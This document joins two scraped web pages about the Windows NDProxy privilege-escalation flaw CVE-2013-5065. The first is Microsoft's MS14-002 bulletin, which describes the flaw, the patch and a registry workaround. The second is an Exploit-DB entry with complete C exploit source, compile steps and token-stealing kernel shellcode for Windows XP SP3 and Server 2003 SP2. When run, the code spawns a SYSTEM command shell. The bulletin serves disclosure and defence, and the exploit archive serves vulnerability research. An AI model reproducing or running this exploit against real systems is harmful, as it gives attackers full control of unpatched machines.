=== Content from docs.microsoft.com_86e830d6_20250125_105938.html ===

[Skip to main content](#main)

This browser is no longer supported.

Upgrade to Microsoft Edge to take advantage of the latest features, security updates, and technical support.

[Download Microsoft Edge](https://go.microsoft.com/fwlink/p/?LinkID=2092881 )
[More info about Internet Explorer and Microsoft Edge](https://learn.microsoft.com/en-us/lifecycle/faq/internet-explorer-microsoft-edge)

Table of contents

Exit focus mode

Read in English

Save

Table of contentsRead in English

Save

Add to plan
[Edit](https://github.com/MicrosoftDocs/security-updates/blob/live/security-updates/SecurityBulletins/2014/ms14-002.md "Edit This Document")

---

#### Share via

Facebook
x.com
LinkedIn
Email

---

Print

Table of contents

# Microsoft Security Bulletin MS14-002 - Important

* Article
* 03/01/2023
* 5 contributors

Feedback

## In this article

## Vulnerability in Windows Kernel Could Allow Elevation of Privilege (2914368)

Published: January 14, 2014

**Version:** 1.0

## General Information

### Executive Summary

This security update resolves a publicly reported vulnerability in Microsoft Windows. The vulnerability could allow elevation of privilege if an attacker logs on to a system and runs a specially crafted application. An attacker must have valid logon credentials and be able to log on locally to exploit this vulnerability.

This security update is rated Important for all supported editions of Windows XP and Windows Server 2003. For more information, see the subsection, **Affected and Non-Affected Software**, in this section.

The security update addresses the vulnerability by correctly validating input passed to the Windows Kernel component. For more information about the vulnerability, see the Frequently Asked Questions (FAQ) subsection for the specific vulnerability entry under the next section, **Vulnerability Information**.

This security update also addresses the vulnerability first described in [Microsoft Security Advisory 2814486](https://technet.microsoft.com/security/advisory/2914486).

**Recommendation**.  Most customers have automatic updating enabled and will not need to take any action because this security update will be downloaded and installed automatically. Customers who have not enabled automatic updating need to check for updates and install this update manually. For information about specific configuration options in automatic updating, see [Microsoft Knowledge Base Article 294871](https://support.microsoft.com/kb/294871).

For administrators and enterprise installations, or end users who want to install this security update manually, Microsoft recommends that customers apply the update at the earliest opportunity using update management software, or by checking for updates using the [Microsoft Update](https://go.microsoft.com/fwlink/?linkid=40747) service.

See also the section, **Detection and Deployment Tools and Guidance**, later in this bulletin.

### Knowledge Base Article

* **Knowledge Base Article**: [2914368](https://support.microsoft.com/kb/2914368)
* **File Information**: Yes
* **SHA1/SHA2 hashes**: Yes
* **Known issues**: None

## Affected and Non-Affected Software

The following software has been tested to determine which versions or editions are affected. Other versions or editions are either past their support life cycle or are not affected. To determine the support life cycle for your software version or edition, see [Microsoft Support Lifecycle](https://go.microsoft.com/fwlink/?linkid=21742).

**Affected Software**

| **Operating System** | **Maximum Security Impact** | **Aggregate Severity Rating** | **Updates Replaced** |
| --- | --- | --- | --- |
| **Windows XP** |  |  |  |
| [Windows XP Service Pack 3](https://www.microsoft.com/download/details.aspx?familyid=6cae1016-419a-47ab-9765-b4c1d7c0865c) (2914368) | Elevation of Privilege | Important | 2440591 in [MS10-099](https://go.microsoft.com/fwlink/?linkid=206365) |
| [Windows XP Professional x64 Edition Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=c1094864-2576-4770-9d2d-3dae33ddecb6) (2914368) | Elevation of Privilege | Important | 2440591 in [MS10-099](https://go.microsoft.com/fwlink/?linkid=206365) |
| **Windows Server 2003** |  |  |  |
| [Windows Server 2003 Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=6d50f851-4be3-413f-b02d-b5b6a3f49fb4) (2914368) | Elevation of Privilege | Important | 2440591 in [MS10-099](https://go.microsoft.com/fwlink/?linkid=206365) |
| [Windows Server 2003 x64 Edition Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=69966ceb-a9c9-4aa7-b685-78562c96640f) (2914368) | Elevation of Privilege | Important | 2440591 in [MS10-099](https://go.microsoft.com/fwlink/?linkid=206365) |
| [Windows Server 2003 with SP2 for Itanium-based Systems](https://www.microsoft.com/download/details.aspx?familyid=0b1c1309-8b6f-4342-92aa-6cb5cb2abe6a) (2914368) | Elevation of Privilege | Important | 2440591 in [MS10-099](https://go.microsoft.com/fwlink/?linkid=206365) |

**Non-Affected Software**

| **Operating System** |
| --- |
| Windows Vista Service Pack 2 |
| Windows Vista x64 Edition Service Pack 2 |
| Windows Server 2008 for 32-bit Systems Service Pack 2 |
| Windows Server 2008 for x64-based Systems Service Pack 2 |
| Windows Server 2008 for Itanium-based Systems Service Pack 2 |
| Windows 7 for 32-bit Systems Service Pack 1 |
| Windows 7 for x64-based Systems Service Pack 1 |
| Windows Server 2008 R2 for x64-based Systems Service Pack 1 |
| Windows Server 2008 R2 for Itanium-based Systems Service Pack 1 |
| Windows 8 for 32-bit Systems |
| Windows 8 for x64-based Systems |
| Windows 8.1 for 32-bit Systems |
| Windows 8.1 for x64-based Systems |
| Windows Server 2012 |
| Windows Server 2012 R2 |
| Windows RT |
| Windows RT 8.1 |
| **Server Core installation option** |
| Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) |
| Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) |
| Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) |
| Windows Server 2012 R2 (Server Core installation) |
| Windows Server 2012 (Server Core installation) |

## Update FAQ

**If I applied the workaround previously described in Microsoft Security Advisory 2914486, should I undo the workaround before or after applying this update?**

Yes, customers should undo the workaround before applying this update. If you do not undo the workaround at some point, services that rely on Telephony Application Programming Interfaces (TAPI) will not function. These services include Remote Access Service (RAS), dial-up networking, and virtual private networking (VPN).

**I am using an older release of the software discussed in this security bulletin. What should I do?**

The affected software listed in this bulletin has been tested to determine which releases are affected. Other releases are past their support life cycle. For more information about the product lifecycle, see the [Microsoft Support Lifecycle](https://go.microsoft.com/fwlink/?linkid=21742) website.

It should be a priority for customers who have older releases of the software to migrate to supported releases to prevent potential exposure to vulnerabilities. To determine the support lifecycle for your software release, see [Select a Product for Lifecycle Information](https://go.microsoft.com/fwlink/?linkid=169555). For more information about service packs for these software releases, see [Service Pack Lifecycle Support Policy](https://go.microsoft.com/fwlink/?linkid=89213).

Customers who require custom support for older software must contact their Microsoft account team representative, their Technical Account Manager, or the appropriate Microsoft partner representative for custom support options. Customers without an Alliance, Premier, or Authorized Contract can contact their local Microsoft sales office. For contact information, see the [Microsoft Worldwide Information](https://go.microsoft.com/fwlink/?linkid=33329) website, select the country in the Contact Information list, and then click **Go** to see a list of telephone numbers. When you call, ask to speak with the local Premier Support sales manager. For more information, see the [Microsoft Support Lifecycle Policy FAQ](https://go.microsoft.com/fwlink/?linkid=169557).

## Severity Ratings and Vulnerability Identifiers

The following severity ratings assume the potential maximum impact of the vulnerability. For information regarding the likelihood, within 30 days of this security bulletin's release, of the exploitability of the vulnerability in relation to its severity rating and security impact, please see the Exploitability Index in the [January bulletin summary](https://technet.microsoft.com/security/bulletin/ms14-jan). For more information, see [Microsoft Exploitability Index](https://technet.microsoft.com/security/cc998259).

| **Vulnerability Severity Rating and Maximum Security Impact by Affected Software** |  |  |
| --- | --- | --- |
| **Affected Software** | **Kernel NDProxy Vulnerability - CVE-2013-5065** | **Aggregate Severity Rating** |
| **Windows XP** |  |  |
| Windows XP Service Pack 3 | **Important**  Elevation of Privilege | **Important** |
| Windows XP Professional x64 Edition Service Pack 2 | **Important**  Elevation of Privilege | **Important** |
| **Windows Server 2003** |  |  |
| Windows Server 2003 Service Pack 2 | **Important**  Elevation of Privilege | **Important** |
| Windows Server 2003 x64 Edition Service Pack 2 | **Important**  Elevation of Privilege | **Important** |
| Windows Server 2003 with SP2 for Itanium-based Systems | **Important**  Elevation of Privilege | **Important** |

## Kernel NDProxy Vulnerability - CVE-2013-5065

An elevation of privilege vulnerability exists in the NDProxy component of the Windows kernel due to improper validation of input passed from user mode to the kernel. The vulnerability could allow an attacker to run code in kernel mode. An attacker who successfully exploited this vulnerability could run a specially crafted application and take complete control of an affected system. The attacker could then install programs; view, change, or delete data; or create new accounts with full administrator rights.

To view this vulnerability as a standard entry in the Common Vulnerabilities and Exposures list, see [CVE-2013-5065](https://www.cve.org/CVERecord?id=CVE-2013-5065).

### Mitigating Factors

Mitigation refers to a setting, common configuration, or general best-practice, existing in a default state, that could reduce the severity of exploitation of a vulnerability. The following mitigating factors may be helpful in your situation:

* An attacker must have valid logon credentials and be able to log on locally to exploit this vulnerability. The vulnerability could not be exploited remotely or by anonymous users.

### Workarounds

Workaround refers to a setting or configuration change that does not correct the underlying vulnerability but would help block known attack vectors before you apply the update. Microsoft has tested the following workarounds and states in the discussion whether a workaround reduces functionality:

* **Reroute the NDProxy service to Null.sys**

  For environments with non-default, limited user privileges, Microsoft has verified that the following workaround effectively blocks the attacks that have been observed in the wild.

  To implement this workaround, follow these steps:

  1. From an elevated command prompt, execute the following commands:

     ```
         sc stop ndproxy
         reg add HKLM\System\CurrentControlSet\Services\ndproxy /v ImagePath /t REG_EXPAND_SZ /d system32\drivers\null.sys /f

     ```
  2. Restart the system.

  **Impact of workaround.** Disabling NDProxy.sys will cause certain services that rely on Windows Telephony Application Programming Interfaces (TAPI) to not function. Services that will no longer work include Remote Access Service (RAS), dial-up networking, and virtual private networking (VPN).

  **How to undo the workaround.**

  To undo this workaround, follow these steps:

  1. From an elevated command prompt, execute the following commands:

     ```
         sc stop ndproxy
         reg add HKLM\System\CurrentControlSet\Services\ndproxy /v ImagePath /t REG_EXPAND_SZ /d system32\drivers\ndproxy.sys /f

     ```
  2. Restart the system.

### FAQ

**What is the scope of the vulnerability?**

This is an elevation of privilege vulnerability.

**What causes the vulnerability?**

The vulnerability is caused when the NDProxy.sys kernel component fails to properly validate input.

**What is NDPROXY?**

NDPROXY is a system-provided driver that interfaces WAN miniport drivers, call managers, and miniport call managers to the Telephony Application Programming Interfaces (TAPI) services. For additional information, see MSDN article, [NDPROXY Overview](https://msdn.microsoft.com/library/ff568322%28vs.85%29.aspx).

**What might an attacker use the vulnerability to do?**

An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. An attacker could then install programs; view, change, or delete data; or create new accounts with full administrative rights.

**How could an attacker exploit the vulnerability?**

To exploit this vulnerability, an attacker would first have to log on to the system. An attacker could then run a specially crafted application that could exploit the vulnerability and take complete control over the affected system.

**What systems are primarily at risk from the vulnerability?**

Workstations and terminal servers are primarily at risk. Servers could be at more risk if administrators allow users to log on to servers and to run programs. However, best practices strongly discourage allowing this.

**What does the update do?**

The update addresses the vulnerability by correctly validating input passed to the Windows Kernel component.

**When this security bulletin was issued, had this vulnerability been publicly disclosed?**

Yes. This vulnerability has been publicly disclosed. It has been assigned Common Vulnerability and Exposure number [CVE-2013-5065](https://www.cve.org/CVERecord?id=CVE-2013-5065). This vulnerability was first described in [Microsoft Security Advisory 2914486](https://technet.microsoft.com/security/advisory/2914486).

**When this security bulletin was issued, had Microsoft received any reports that this vulnerability was being exploited?**

Yes. Microsoft was aware of limited, targeted attacks that attempt to exploit this vulnerability.

## Detection and Deployment Tools and Guidance

Several resources are available to help administrators deploy security updates.

* Microsoft Baseline Security Analyzer (MBSA) lets administrators scan local and remote systems for missing security updates and common security misconfigurations.
* Windows Server Update Services (WSUS), Systems Management Server (SMS), and System Center Configuration Manager help administrators distribute security updates.
* The Update Compatibility Evaluator components included with Application Compatibility Toolkit aid in streamlining the testing and validation of Windows updates against installed applications.

For information about these and other tools that are available, see [Security Tools for IT Pros](https://technet.microsoft.com/security/cc297183).

## Security Update Deployment

### Windows XP (all editions)

**Reference Table**

The following table contains the security update information for this software.

| **Security update file names** | For all supported 32-bit editions of Windows XP:\ **WindowsXP-KB2914368-x86-ENU.exe** |
| --- | --- |
| \ | For all supported x64-based editions of Windows XP Professional:\ **WindowsServer2003.WindowsXP-KB2914368-x64-ENU.exe** |
| **Installation switches** | See [Microsoft Knowledge Base Article 262841](https://support.microsoft.com/kb/262841) |
| **Update log file** | KB2914368.log |
| **Restart requirement** | Yes, you must restart your system after you apply this security update. |
| **Removal information** | Use **Add or Remove Programs** item in Control Panel or the Spuninst.exe utility located in the %Windir%$NTUninstallKB2914368$\Spuninst folder |
| **File information** | See [Microsoft Knowledge Base Article 2914368](https://support.microsoft.com/kb/2914368) |
| **Registry key verification** | For all supported 32-bit editions of Windows XP:\ HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Updates\Windows XP\SP4\KB2914368\Filelist |
| \ | For all supported x64-based editions of Windows XP:\ HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Updates\Windows XP Version 2003\SP3\KB2914368\Filelist |

**Note** The update for supported versions of Windows XP Professional x64 Edition also applies to supported versions of Windows Server 2003 x64 Edition.

### Windows Server 2003 (all editions)

**Reference Table**

The following table contains the security update information for this software.

| **Security update file names** | For all supported 32-bit editions of Windows Server 2003:\ **WindowsServer2003-KB2914368-x86-ENU.exe** |
| --- | --- |
| \ | For all supported x64-based editions of Windows Server 2003:\ **WindowsServer2003.WindowsXP-KB2914368-x64-ENU.exe** |
| \ | For all supported Itanium-based editions of Windows Server 2003:\ **WindowsServer2003-KB2914368-ia64-ENU.exe** |
| **Installation switches** | See [Microsoft Knowledge Base Article 262841](https://support.microsoft.com/kb/262841) |
| **Update log file** | KB2914368.log |
| **Restart requirement** | Yes, you must restart your system after you apply this security update. |
| **Removal information** | Use **Add or Remove Programs** item in Control Panel or the Spuninst.exe utility located in the %Windir%$NTUninstallKB2914368$\Spuninst folder |
| **File information** | See [Microsoft Knowledge Base Article 2914368](https://support.microsoft.com/kb/2914368) |
| **Registry key verification** | HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Updates\Windows Server 2003\SP3\KB2914368\Filelist |

**Note** The update for supported versions of Windows Server 2003 x64 Edition also applies to supported versions of Windows XP Professional x64 Edition.

## Acknowledgments

Microsoft [thanks](https://go.microsoft.com/fwlink/?linkid=21127) the following for working with us to help protect customers:

* [FireEye, Inc.](https://www2.fireeye.com/) for helping us with the Kernel NDProxy Vulnerability (CVE-2013-5065)

## Other Information

### Microsoft Active Protections Program (MAPP)

To improve security protections for customers, Microsoft provides vulnerability information to major security software providers in advance of each monthly security update release. Security software providers can then use this vulnerability information to provide updated protections to customers via their security software or devices, such as antivirus, network-based intrusion detection systems, or host-based intrusion prevention systems. To determine whether active protections are available from security software providers, please go to the active protections websites provided by program partners, listed in [Microsoft Active Protections Program (MAPP) Partners](https://go.microsoft.com/fwlink/?linkid=215201).

### Support

**How to obtain help and support for this security update**

* Help installing updates: [Support for Microsoft Update](https://support.microsoft.com/ph/6527)
* Security solutions for IT professionals: [TechNet Security Troubleshooting and Support](https://technet.microsoft.com/security/bb980617.aspx)
* Help protect your computer that is running Windows from viruses and malware: [Virus Solution and Security Center](https://support.microsoft.com/contactus/cu_sc_virsec_master)
* Local support according to your country: [International Support](https://support.microsoft.com/common/international.aspx)

### Disclaimer

The information provided in the Microsoft Knowledge Base is provided "as is" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.

### Revisions

* V1.0 (January 14, 2014): Bulletin published.

*Page generated 2014-06-25 13:41Z-07:00.*

---

## Additional resources

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025
## Additional resources

### In this article

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025



=== Content from www.exploit-db.com_b4612467_20250125_105941.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Microsoft Windows XP SP3 (x86) / 2003 SP2 (x86) - 'NDProxy' Local Privilege Escalation (MS14-002)

#### EDB-ID:

###### 37732

#### CVE:

###### [2013-5065](https://nvd.nist.gov/vuln/detail/CVE-2013-5065)

---

**EDB Verified:**

#### Author:

###### [Tomislav Paskalev](/?author=7919)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [Windows\_x86](/?platform=windows_x86)

#### Date:

###### 2015-08-07

---

**Vulnerable App:**

```
/*
################################################################
# Exploit Title: Windows NDProxy Privilege Escalation (MS14-002)
# Date: 2015-08-03
# Exploit Author: Tomislav Paskalev
# Vulnerable Software:
#   Windows XP SP3 x86
#   Windows XP SP2 x86-64
#   Windows 2003 SP2 x86
#   Windows 2003 SP2 x86-64
#   Windows 2003 SP2 IA-64
# Supported vulnerable software:
#   Windows XP SP3 x86
#   Windows 2003 SP2 x86
# Tested on:
#   Windows XP SP3 x86 EN
#   Windows 2003 SP2 x86 EN
# CVE ID: 2013-5065
################################################################
# Vulnerability description:
#   NDPROXY is a system-provided driver that interfaces WAN
#   miniport drivers, call managers, and miniport call managers
#   to the Telephony Application Programming Interfaces (TAPI)
#   services.
#   The vulnerability is caused when the NDProxy.sys kernel
#   component fails to properly validate input.
#   An attacker who successfully exploited this vulnerability
#   could run arbitrary code in kernel mode (i.e. with SYSTEM
#   privileges).
################################################################
# Exploit notes:
#   Privileged shell execution:
#     - the SYSTEM shell will spawn within the existing shell
#       (i.e. exploit usable via a remote shell)
#   Exploit compiling:
#     - # i586-mingw32msvc-gcc MS14-002.c -o MS14-002.exe
#   Exploit prerequisites:
#     - low privilege access to the target (remote shell or RDP)
#     - target not patched (KB2914368 not installed)
#     - service "Routing and Remote Access" running on the target
#       - "Power User" user group can start and stop services
#         - > sc query remoteaccess
#         - > sc start remoteaccess
################################################################
# Thanks to:
#   Andy (C PoC - Win XP SP3)
#   ryujin (Python PoC - Win XP SP3)
################################################################
# References:
#   http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-5065
#   https://technet.microsoft.com/en-us/library/security/ms14-002.aspx
#   https://penturalabs.wordpress.com/2013/12/11/ndproxy-privilege-escalation-cve-2013-5065/
#   https://www.exploit-db.com/exploits/30014/
#   https://msdn.microsoft.com/en-us/library/windows/desktop/ms681674%28v=vs.85%29.aspx
#   https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858%28v=vs.85%29.aspx
#   https://msdn.microsoft.com/en-us/library/windows/desktop/ms681381%28v=vs.85%29.aspx
#   https://msdn.microsoft.com/en-us/library/windows/desktop/aa363216%28v=vs.85%29.aspx
################################################################
*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

typedef struct {
    PVOID   Unknown1;
    PVOID   Unknown2;
    PVOID   Base;
    ULONG   Size;
    ULONG   Flags;
    USHORT  Index;
    USHORT  NameLength;
    USHORT  LoadCount;
    USHORT  PathLength;
    CHAR    ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct {
    ULONG   Count;
    SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemModuleInformation = 11,
    SystemHandleInformation = 16
} SYSTEM_INFORMATION_CLASS;

typedef DWORD NTSTATUS;
NTSTATUS (WINAPI *_NtQuerySystemInformation) (SYSTEM_INFORMATION_CLASS SystemInformationClass,
         PVOID SystemInformation,
         ULONG SystemInformationLength,
         PULONG ReturnLength);

static VOID InitFirstPage (void)
{
    PVOID BaseAddress;
    ULONG RegionSize;
    NTSTATUS ReturnCode;
    FARPROC NtAllocateVirtualMemory;

    NtAllocateVirtualMemory = GetProcAddress (GetModuleHandle ("NTDLL.DLL"), "NtAllocateVirtualMemory");

    fprintf (stderr, "[+] NtAllocateVirtualMemory@%p\n", NtAllocateVirtualMemory);
    RegionSize = 0xf000;
    BaseAddress = (PVOID) 0x00000001;
    ReturnCode = NtAllocateVirtualMemory (GetCurrentProcess (),
                                         &BaseAddress,
	                                     0,
                                         &RegionSize,
                                         MEM_COMMIT | MEM_RESERVE,
                                         PAGE_EXECUTE_READWRITE);
    if (ReturnCode != 0)
    {
         fprintf (stderr, "[-] NtAllocateVirtualMemory() failed to map first page\n");
         fprintf (stderr, "    Error code: %#X\n", ReturnCode);
         fflush (stderr);
         ExitProcess (1);
    }
    fprintf (stderr, "[+] BaseAddress: %p, RegionSize: %#x\n", BaseAddress, RegionSize), fflush (stderr);
    FillMemory (BaseAddress, RegionSize, 0x41);
    return;
}

int exploit (unsigned char *shellcode)
{
    DWORD writtenBytes;
    int returnValue;

    InitFirstPage ();

    unsigned char *shellcodeBuffer;
    shellcodeBuffer = (char *) malloc (400);
    memset (shellcodeBuffer, (int) "xCC", 400);
    memcpy (shellcodeBuffer, shellcode, 112);

    returnValue = WriteProcessMemory ((HANDLE) 0xFFFFFFFF, (LPVOID) 0x00000001, shellcodeBuffer, 0x400, &writtenBytes);
    if (returnValue == 0)
    {
        printf ("[-] Attempt to map memory_write failed\n");
        printf ("    Error code: %d\n", GetLastError ());
        exit(1);
    }
    HANDLE ndProxyDeviceHandle = CreateFileA ("\\\\.\\NDProxy", 0, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (ndProxyDeviceHandle == INVALID_HANDLE_VALUE)
    {
        printf ("[-] Creating a device handle on NDProxy failed\n");
        printf ("    Error code: %d\n", GetLastError());
        exit (0);
    }
    DWORD inputBuffer [0x15] = {0};
    DWORD returnedBytes = 0;
    *(inputBuffer + 5) = 0x7030125;
    *(inputBuffer + 7) = 0x34;
    DeviceIoControl (ndProxyDeviceHandle, 0x8fff23cc, inputBuffer, 0x54, inputBuffer, 0x24, &returnedBytes, 0);
    CloseHandle (ndProxyDeviceHandle);
    system ("cmd.exe /T:C0 /K cd c:\\windows\\system32");
    return 0;
}

int main (int argc, char **argv)
{
    if (argc != 2)
    {
        printf ("[*] Usage: %s OS_TYPE\n", argv[0]);
        printf ("           supported OS_TYPE:\n");
        printf ("                  XP  - Windows XP SP3 x86\n");
        printf ("                  2k3 - Windows 2003 SP2 x86\n");
        printf ("[*] Note:  the service \"Routing and Remote Access\"\n");
        printf ("           must be running on the target machine\n");
        exit (0);
    }
    else
    {
        if ((strcmp (argv[1], "xp") == 0) || (strcmp (argv[1], "XP") == 0))
        {
            unsigned char shellcodeXP[] =
            "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
            "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
            "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
            "\x90\x90\x90\x90\x90\x90\x90\x90\x3C\x00\x00\x00\x90\x90\x90\x90"
            "\x90\x33\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x44\x8B\xC8\x8B"
            "\x80\x88\x00\x00\x00\x2D\x88\x00\x00\x00\x83\xB8\x84\x00\x00\x00"
            "\x04\x75\xEC\x8B\x90\xC8\x00\x00\x00\x89\x91\xC8\x00\x00\x00\xC3";
            exploit (shellcodeXP);
        }
        else if ((strcmp (argv[1], "2k3") == 0) || (strcmp (argv[1], "2K3") == 0))
        {
            unsigned char shellcode2k3[] =
            "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
            "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
            "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
            "\x90\x90\x90\x90\x90\x90\x90\x90\x3C\x00\x00\x00\x90\x90\x90\x90"
            "\x90\x33\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x38\x8B\xC8\x8B"
            "\x80\x98\x00\x00\x00\x2D\x98\x00\x00\x00\x83\xB8\x94\x00\x00\x00"
            "\x04\x75\xEC\x8B\x90\xD8\x00\x00\x00\x89\x91\xD8\x00\x00\x00\xC3";
            exploit (shellcode2k3);
        }
        else
        {
            printf ("[-] Invalid argument\n");
            printf ("    Argument used: %s\n", argv[1]);
            exit(0);
        }
    }
}

```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

